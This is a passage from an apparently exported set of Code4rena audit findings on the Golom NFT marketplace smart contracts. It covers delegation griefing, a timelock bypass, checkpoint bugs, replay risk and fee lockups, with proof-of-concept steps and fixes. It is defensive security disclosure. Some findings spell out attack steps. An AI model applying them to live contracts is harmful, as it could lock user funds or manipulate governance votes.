checkpoints[tokenId][nCheckpoints - 1]; +       Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId);         _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);     } ```  or  2. Load the delegatee from the mapping `delegates` which maps each delegator to its current delegatee:  ```diff     function removeDelegation(uint256 tokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed'); +       uint256 toTokenId = delegates[tokenId];         uint256 nCheckpoints = numCheckpoints[tokenId]; -       Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1]; +       Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId);         _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);     } ```"}, {"title": "Voter in VoteEscrowCore can permanently lock user tokens", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/712", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L873-L876 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L883-L886 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L894 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L538 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1008   # Vulnerability details  ## Impact A malicious voter can arbitrarily increase the number of `attachments` or set the `voted` status of a token to true. This prevents the token from being withdrawn, merged or transfered thereby locking the tokens into the contract for as long as the voter would like.   I submitted this is as a medium severity because it has external circumstances (a malicious voter) however has a very high impact if it does occur.  ## Proof of Concept 1. A user creates a lock for their token and deposits it into the VoteEscrowDelegate/Core contract. 2. The malicious voter then calls either `voting()` or `attach()` thereby preventing the user withdrawing their token after the locked time bypasses  ## Tools Used VS Code ## Recommended Mitigation Steps I have not seen any use of `voting()` or `attach()` in any of the other contracts so it may be sensible to remove those functions altogether. On the other hand, setting voter to be smart contract which is not malicious offsets this problem."}, {"title": "Griefer can minimize delegatee's voting power", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/707", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L99 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L71-L89   # Vulnerability details  ## Impact Similar to a previous submission, there are no checks preventing against delegating the same lock NFT multiple times. This opens an avenue to an expensive but potentially profitable griefing attack where the malicious user fills the victim's delegated token array with minimum voting power. The attacker can ensure that a delegatee has 0 voting power.  ## Proof of Concept Taking a look at the `delegate()` function below, there are no checks that a lock NFT has not already been delegated. Therefore, an attacker can delegate their token with minimum voting power (threshold initialized with value 0) to the victim.   ```     function delegate(uint256 tokenId, uint256 toTokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');           delegates[tokenId] = toTokenId;         uint256 nCheckpoints = numCheckpoints[toTokenId];           if (nCheckpoints > 0) {             Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];             checkpoint.delegatedTokenIds.push(tokenId);             _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);         } else {             uint256[] memory array = new uint256[](1);             array[0] = tokenId;             _writeCheckpoint(toTokenId, nCheckpoints, array);         }           emit DelegateChanged(tokenId, toTokenId, msg.sender);     } ```  There is a limit of 500 delegated tokens per delegatee. Therefore, the attacker can ensure minimum voting power if they delegate a worthless token 500 times to the victim:  ```     function _writeCheckpoint(         uint256 toTokenId,         uint256 nCheckpoints,         uint256[] memory _delegatedTokenIds     ) internal {         require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more'); ```  A more likely scenario would be as follows: - A proposal is live. - Users delegate their voting power to addresses of their choosing. - A and B are around the same voting power. - A and B both have 400 delegatees. - Malicious address A delegates minimum voting power 100 times to fill B's array to 500. - Address A can self-delegate just a bit more to obtain more voting power.   ## Tools Used Manual review.  ## Recommended Mitigation Steps Firstly, removing the ability to delegate the same lock NFT would make this griefing attack much more expensive. Even if that is patched, a griefing attack is still possible by simply creating more locks and delegating them all once.   I believe that removing the 500 delegated token limit would prove to mitigate this issue."}, {"title": "Some setters' timelock can be bypassed", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/698", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L58-L72 https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L444-L457 https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L298-L311   # Vulnerability details  ## Impact  MED - Function could be impacted  As the timelock does not work as supposed to work, the owner of the contract can bypass timelock.  - effected Functions:   - `GolomToken`: `setMinter`, `executeSetMinter`   - `GolomTrader`: `setDistributor`, `executeSetDistributor`   - `RewardDistributor`: `addVoteEscrow`, `executeAddVoteEscrow`   ## Proof of Concept  - [GolomTrader::it can bypass timelock poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtrader-specs-ts-diff-L15-L26) - [GolomToken::setMinter it should set the minter with timelock poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtoken-specs-ts-diff-L10-L29)   The [first poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtrader-specs-ts-diff-L15-L26 ) shows to bypass timelock for `GolomTrader::setDistributor`. The same logic applies for the `RewardDistributor::addVoteEscrow`. 0. The `setDistributor` was called once in the beforeEach block to set the initial distributor. For this exploit to work, the `setDistributor` should be called only once. If `setDistributor` was called more than once, one can set the distributor to zero address (with timelock like in the `GolomToken` case, then set to a new distributor after that) 1. reset distributor to zero address without timelock by calling `executeSetDistributor` 2. set a new distributor without timelock by calling `setDistributor` 3. Rinse and repeat: as long as `setDistributor` is not called multiple times in row, the owner can keep setting distributor without timelock.   A little bit different variation of timelock bypass was found in the `GolomToken`. Although the owner should wait for the timelock to set the minter to zero address, but after that, the owner can set to the new minter without waiting for a timelock. Since the meaning of timelock is to let people know the new minter's implementation, if the owner can bypass that, the timelock is almost meaningless. The exploitation steps: [the second proof of concept](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtoken-specs-ts-diff-L10-L29 ) 1. call `setMineter` with zero address 2. wait for the timelock 3. call `executeSetMineter` to set the minter to zero address 4. now the onwer can call `setMineter` with any address and call `executeSetMinter` without waiting for the timelock   The owner can call `executeSetdistributor` even though there is no `pendingDistributor` set before. Also, `setDistributor` sets the new distributor without timelock when the existing distributor's address is zero.  ```solidity // GolomTrader // almost identical logic was used in `RewardDistributor` to addVoteEscrow // similar logic was used in `GolomToken` to `setMineter`   444     function setDistributor(address _distributor) external onlyOwner { 445         if (address(distributor) == address(0)) { 446             distributor = Distributor(_distributor); 447         } else { 448             pendingDistributor = _distributor; 449             distributorEnableDate = block.timestamp + 1 days; 450         } 451     } 452 453     /// @notice Executes the set distributor function after the timelock 454     function executeSetDistributor() external onlyOwner { 455         require(distributorEnableDate <= block.timestamp, 'not allowed'); 456         distributor = Distributor(pendingDistributor); 457     } ```   ## Tools Used  None  ## Recommended Mitigation Steps  To mitigate, execute functions can check whether pendingDistributor is not zero. It will ensure that the setters are called before executing them, as well as prevent to set to zero addresses.  <!-- zzzitron 01M -->    "}, {"title": "`VoteEscrowDelegation._transferFrom` can only be executed by the token owner", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/631", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L242 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L211   # Vulnerability details  ## Impact  `VoteEscrowDelegation._transferFrom` should be successfully executed if `msg.sender` is the current owner, an authorized operator, or the approved address. `removeDelegation` is called in `_transferFrom`. `removeDelegation` only accepts the token owner. Thus, `_transferFrom` can only be executed by the token owner.  ## Proof of Concept  `removeDelegation` is called in `_transferFrom` https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L242 ```     function _transferFrom(         address _from,         address _to,         uint256 _tokenId,         address _sender     ) internal override {         require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');          // remove the delegation         this.removeDelegation(_tokenId);          // Check requirements         require(_isApprovedOrOwner(_sender, _tokenId));         \u2026     } ```  However, `removeDelegation` only accept the token owner https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L211 ```     function removeDelegation(uint256 tokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         uint256 nCheckpoints = numCheckpoints[tokenId];         Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId);         _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);     } ```  ## Tools Used  None  ## Recommended Mitigation Steps  Fix the permission control in `removeDelegation`   "}, {"title": "`VoteEscrowDelegation._writeCheckpoint` fails when `nCheckpoints` is 0", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/630", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "old-submission-method", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L101 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L82-L86   # Vulnerability details  ## Impact  When a user call `VoteEscrowDelegation.delegate` to make a delegation, it calls `VoteEscrowDelegation._writeCheckpoint` to update the checkpoint of `toTokenId`. However, if `nCheckpoints` is 0, `_writeCheckpoint` always reverts. What\u2019s worse, `nCheckpoints` would be zero before any delegation has been made. In conclusion, users cannot make any delegation.  ## Proof of Concept  When a user call `VoteEscrowDelegation.delegate` to make a delegation, it calls `VoteEscrowDelegation._writeCheckpoint` to update the checkpoint of `toTokenId`. https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L82-L86 ```     function delegate(uint256 tokenId, uint256 toTokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');          delegates[tokenId] = toTokenId;         uint256 nCheckpoints = numCheckpoints[toTokenId];          if (nCheckpoints > 0) {             Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];             checkpoint.delegatedTokenIds.push(tokenId);             _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);         } else {             uint256[] memory array = new uint256[](1);             array[0] = tokenId;             _writeCheckpoint(toTokenId, nCheckpoints, array);         }          emit DelegateChanged(tokenId, toTokenId, msg.sender);     } ```  if `nCheckpoints` is 0, `_writeCheckpoint` always reverts. Because `checkpoints[toTokenId][nCheckpoints - 1]` will trigger underflow in Solidity 0.8.11 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L101 ```     function _writeCheckpoint(         uint256 toTokenId,         uint256 nCheckpoints,         uint256[] memory _delegatedTokenIds     ) internal {         require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');          Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];         \u2026     } ```  ## Tools Used  None  ## Recommended Mitigation Steps  Fix `_writeCheckpoint`  ```     function _writeCheckpoint(         uint256 toTokenId,         uint256 nCheckpoints,         uint256[] memory _delegatedTokenIds     ) internal {         require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');               if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {             Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];             oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;         } else {             checkpoints[toTokenId][nCheckpoints] = Checkpoint(block.number, _delegatedTokenIds);             numCheckpoints[toTokenId] = nCheckpoints + 1;         }     } ```   "}, {"title": "When MIN_VOTING_POWER_REQUIRED is changed, previous votes are not affected.", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/626", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "edited-by-warden", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L168-L194   # Vulnerability details  ## Impact When MIN_VOTING_POWER_REQUIRED is changed, tokenIDs with votes lower than MIN_VOTING_POWER_REQUIRED will not be able to vote through the delegate function, but previous votes will not be affected. Since MIN_VOTING_POWER_REQUIRED is mainly used to reduce the influence of spam users, changing this value should affect previous votes. ## Proof of Concept https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L168-L194 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L260-L262 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L73-L74 ## Tools Used None ## Recommended Mitigation Steps In the getPriorVotes and getVotes functions, when the balance corresponding to tokenId is less than MIN_VOTING_POWER_REQUIRED, the value of votes will not be increased ```diff     function getVotes(uint256 tokenId) external view returns (uint256) {         uint256[] memory delegated = _getCurrentDelegated(tokenId);         uint256 votes = 0;         for (uint256 index = 0; index < delegated.length; index++) { +         if(this.balanceOfNFT(delegated[index]) >= MIN_VOTING_POWER_REQUIRED){             votes = votes + this.balanceOfNFT(delegated[index]); +       }         }         return votes;     }       /**      * @notice Determine the prior number of votes for an account as of a block number      * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.      * @param tokenId The address of the account to check      * @param blockNumber The block number to get the vote balance at      * @return The number of votes the account had as of the given block      */     function getPriorVotes(uint256 tokenId, uint256 blockNumber) public view returns (uint256) {         require(blockNumber < block.number, 'VEDelegation: not yet determined');         uint256[] memory delegatednft = _getPriorDelegated(tokenId, blockNumber);         uint256 votes = 0;         for (uint256 index = 0; index < delegatednft.length; index++) { +         if(this.balanceOfAtNFT(delegatednft[index], blockNumber) >= MIN_VOTING_POWER_REQUIRED){             votes = votes + this.balanceOfAtNFT(delegatednft[index], blockNumber); +         }         }         return votes;     } ```"}, {"title": "Owner can not set the `ve` address via `RewardDistributor.addVoteEscrow`", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/611", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L300 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L173   # Vulnerability details  ## Impact  On the initial `RewardDistributor.addVoteEscrow` call, the owner of the contract can set the `ve` address without a timelock (which is as intended according to the function documentation). However, as the function parameter `_voteEscrow` is not used for the assignment, instead the storage variable `pendingVoteEscrow` (which is not initialized, hence `address(0)`) is used, the `ve` storage variable can not be set to the provided `_voteEscrow` address.  This prevents setting the `ve` address (`ve` is set to `address(0)`) and therefore prevents `veNFT` holders to claim reward tokens and Ether rewards via `RewardDistributor.multiStakerClaim`.  ## Proof of Concept  [RewardDistributor.sol#L300](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L300)  ```solidity function addVoteEscrow(address _voteEscrow) external onlyOwner {     if (address(ve) == address(0)) {         ve = VE(pendingVoteEscrow); // @audit-info The wrong variable is used. It should be `_voteEscrow`     } else {         voteEscrowEnableDate = block.timestamp + 1 days;         pendingVoteEscrow = _voteEscrow;     } } ```  [RewardDistributor.sol#L173](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L173)  ```solidity function multiStakerClaim(uint256[] memory tokenids, uint256[] memory epochs) public {     require(address(ve) != address(0), ' VE not added yet'); // @audit-info reverts if `ve` is not initialized      ... } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Use the correct function parameter `_voteEscrow`:  ```solidity function addVoteEscrow(address _voteEscrow) external onlyOwner {     if (address(ve) == address(0)) {         ve = VE(_voteEscrow);     } else {         voteEscrowEnableDate = block.timestamp + 1 days;         pendingVoteEscrow = _voteEscrow;     } } ``` "}, {"title": " `VoteEscrowCore.safeTransferFrom` does not check correct magic bytes returned from receiver contract's `onERC721Received` function", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/577", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ce0068c21ecd97c6ec8fb0db08570f4b43029dde/contracts/token/ERC721/ERC721.sol#L395-L417   # Vulnerability details  ## Impact  While `VoteEscrowCore.safeTransferFrom` does try to call `onERC721Received` on the receiver it does not check the for the required \"magic bytes\" which is `IERC721.onERC721received.selector` in this case. See [OpenZeppelin docs](https://docs.openzeppelin.com/contracts/3.x/api/token/erc721#IERC721Receiver-onERC721Received-address-address-uint256-bytes-) for more information.  It's quite possible that a call to `onERC721Received` could succeed because the contract had a `fallback` function implemented, but the contract is not ERC721 compliant.  The impact is that NFT tokens may be sent to non-compliant contracts and lost.  ## Proof of Concept  [Lines 604 - 605](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L604-L605) are:  ```solidity try IERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) returns (bytes4) {} catch (     bytes memory reason ```  but they should be:  ```solidity try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {     return retval == IERC721Receiver.onERC721Received.selector; } catch (bytes memory reason) ```  ## Recommended Mitigation Steps  Implement `safeTransferReturn` so that it checks the required magic bytes: `IERC721Receiver.onERC721Received.selector`. "}, {"title": "_writeCheckpoint does not write to storage on same block", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/455", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/golom-protocol/contracts/blob/4e84d5c2115d163ca54a1729da46164e8cf4df6d/contracts/vote-escrow/VoteEscrowDelegation.sol#L101-L108   # Vulnerability details  ## Impact In `VoteEscrowDelegation._writeCheckpoint`, when the checkpoint is overwritten in the same block the new value is set with `memory oldCheckpoint` and thus is never written to storage.  ```javascript Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];  if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {  oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;  } ```  Users that remove and delegate a token (or call `delegate` on the same token twice) in the same block will only have their first delegation persisted.  ## Proof of Concept - User delegates a `tokenId` by calling `delegate`. - In the same block, the user decides to delgate the same token to a different token ID and calls `delegate` again which calls `_writeCheckpoint`.  Since this is the second transaction in the same block the if statement in the code block above executes and stores `_delegatedTokenIds` in `memory oldCheckpoint`, thus not persisting the array of `_delegatedTokenIds` in the checkpoint.  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps Define the `oldCheckpoint` variable as a `storage` pointer:  `Checkpoint storage oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];` "}, {"title": "Replay attack in case of Hard fork", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/391", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L98   # Vulnerability details  ## Impact If there is ever a hardfork for Golom then EIP712_DOMAIN_TYPEHASH value will become invalid. This is because the chainId parameter is computed in constructor. This means even after hard fork chainId would remain same which is incorrect and could cause possible replay attacks  ## Proof of Concept 1. Observe the constructor  ``` constructor(address _governance) {         // sets governance as owner         _transferOwnership(_governance);          uint256 chainId;         assembly {             chainId := chainid()         }          EIP712_DOMAIN_TYPEHASH = keccak256(             abi.encode(                 keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),                 keccak256(bytes('GOLOM.IO')),                 keccak256(bytes('1')),                 chainId,                 address(this)             )         );     } ```  2. As we can see the chainId is derived and then hardcoded in EIP712_DOMAIN_TYPEHASH   3. This means even after hard fork, EIP712_DOMAIN_TYPEHASH value will remain same and point to incorrect chainId  ## Recommended Mitigation Steps The EIP712_DOMAIN_TYPEHASH variable should be recomputed everytime by placing current value of chainId"}, {"title": "NFT transferring won't work because of the external call to `removeDelegation`.", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/377", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L242 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L211   # Vulnerability details  ## Impact The `VoteEscrowDelegation._transferFrom` function won't work because it calls `this.removeDelegation(_tokenId)`. The `removeDelegation` function is external, so when the call is done by `this.removeDelegation(_tokenId)` msg.sender changes to the contract address.  This causes the check in the `` function to (most likely) fail because the contract is not the owner of the NFT, and that will make the function revert. `require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');`  ## Tools Used Manual audit (VS Code & my mind)  ## Recommended Mitigation Steps Make the `removeDelegation` function public and call it without changing the context (i.e. without changing msg.sender to the contract's address). "}, {"title": "Use `call()` rather than `transfer()` on address payable", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/343", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L154   # Vulnerability details  ### Impact  [L154](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L154) in [GolomTrader.sol](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol) uses `.transfer()` to send ether to other addresses. There are a number of issues with using `.transfer()`, as it can fail for a number of reasons (specified in the Proof of Concept).  ### Proof of Concept  1. The destination is a smart contract that doesn\u2019t implement a `payable` function or it implements a `payable` function but that function uses more than 2300 gas units. 2. The destination is a smart contract that doesn\u2019t implement a `payable` `fallback` function or it implements a `payable` `fallback` function but that function uses more than 2300 gas units. 3. The destination is a smart contract but that smart contract is called via an intermediate proxy contract increasing the case requirements to more than 2300 gas units. A further example of unknown destination complexity is that of a multisig wallet that as part of its operation uses more than 2300 gas units. 4. Future changes or forks in Ethereum result in higher gas fees than transfer provides. The `.transfer()` creates a hard dependency on 2300 gas units being appropriate now and into the future.  ### Tools Used  Vim  ### Recommended Remediation Steps  Instead use the `.call()` function to transfer ether and avoid some of the limitations of `.transfer()`. This would be accomplished by changing `payEther()` to something like;  ```solidity (bool success, ) = payable(payAddress).call{value: payAmt}(\"\"); // royalty transfer to royaltyaddress require(success, \"Transfer failed.\"); ```  Gas units can also be passed to the `.call()` function as a variable to accomodate any uses edge cases. Gas could be a mutable state variable that can be set by the contract owner. "}, {"title": "Use safeTransferFrom Instead of transferFrom for ERC721", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/342", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L236   # Vulnerability details  ## Impact Use of transferFrom method for ERC721 transfer is discouraged and recommended to use safeTransferFrom  whenever possible by OpenZeppelin. This is because transferFrom() cannot check whether the receiving address know how to handle ERC721 tokens.  In the function shown at below PoC, ERC721 token is sent to msg.sender with the transferFrom method. If this msg.sender is a contract and is not aware of incoming ERC721 tokens, the sent token could be locked up in the contract forever.  Reference: https://docs.openzeppelin.com/contracts/3.x/api/token/erc721  ## Proof of Concept ``` GolomTrader.sol:236:            ERC721(o.collection).transferFrom(o.signer, receiver, o.tokenId); ```  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps I recommend to call the safeTransferFrom() method instead of transferFrom() for NFT transfers."}, {"title": "`addFee` will stop accumulating fee once `rewardToken` has reached max supply", "html_url": "https://github.com/code-423n4/2022-07-golom-findings/issues/320", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report"], "target": "2022-07-golom-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L98-L138   # Vulnerability details  ## Impact `RewardDistributor` will stop accumulating fees for staker rewards once `rewardToken` supply has reached the maximum supply (1 billion).  ## Vulnerability Details [RewardDistributor.sol#L98-L138](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L98-L138) ``` function addFee(address[2] memory addr, uint256 fee) public onlyTrader {     if (rewardToken.totalSupply() > 1000000000 * 10**18) {         // if supply is greater then a billion dont mint anything, dont add trades         return;     }          ...          feesTrader[addr[0]][epoch] = feesTrader[addr[0]][epoch] + fee;     feesExchange[addr[1]][epoch] = feesExchange[addr[1]][epoch] + fee;     epochTotalFee[epoch] = epochTotalFee[epoch] + fee; } ``` The check at the beginning of `addFee` is supposed to stop `RewardDistributor` from minting additional rewardToken once it has reached 1 billion supply. However, the current implementation has a side effect of causing the function to skip recording accumulated trading fees (the last 3 lines of the function). This will cause stakers to lose their trading fee rewards once the max supply has been reached, and the funds will be permanently locked in the contract.  ## Proof of Concept - Alice staked `GOLOM` to receive fee rewards from `RewardDistributor`. - `GOLOM` supply reaches 1 billion token. - Traders keep trading on `GolomTrader`, sending protocol fees to `RewardDistributor`. However, `RewardDistributor.addFee` does not update the fee accounting. - Alice won't receive any fee reward and protocol fees are stuck in the contract.  ## Recommended Mitigation Steps Modify `addFee` so that the check won't skip accruing trade fees: ``` function addFee(address[2] memory addr, uint256 fee) public onlyTrader {     if (block.timestamp > startTime + (epoch) * secsInDay) {         uint256 previousEpochFee = epochTotalFee[epoch];         epoch = epoch + 1;          if (rewardToken.totalSupply() > 1000000000 * 10**18) {             emit NewEpoch(epoch, 0, 0, previousEpochFee);         } else {             uint256 tokenToEmit = (dailyEmission * (rewardToken.totalSupply() - rewardToken.balanceOf(address(ve)))) /                 rewardToken.totalSupply();             uint256 stakerReward = (tokenToEmit * rewardToken.balanceOf(address(ve))) / rewardToken.totalSupply();              rewardStaker[epoch] = stakerReward;             rewardTrader[epoch] = ((tokenToEmit - stakerReward) * 67) / 100;             rewardExchange[epoch] = ((tokenToEmit - stakerReward) * 33) / 100;             rewardToken.mint(address(this), tokenToEmit);             epochBeginTime[epoch] = block.number;             if (previousEpochFee > 0) {                 if (epoch == 1){                     epochTotalFee[0] =  address(this).balance; // staking and trading rewards start at epoch 1, for epoch 0 all contract ETH balance is converted to staker rewards rewards.                     weth.deposit{value: address(this).balance}();                   }else{                     weth.deposit{value: previousEpochFee}();                 }             }             emit NewEpoch(epoch, tokenToEmit, stakerReward, previousEpochFee);         }     }     feesTrader[addr[0]][epoch] = feesTrader[addr[0]][epoch] + fee;     feesExchange[addr[1]][epoch] = feesExchange[addr[1]][epoch] + fee;     epochTotalFee[epoch] = epochTotalFee[epoch] + 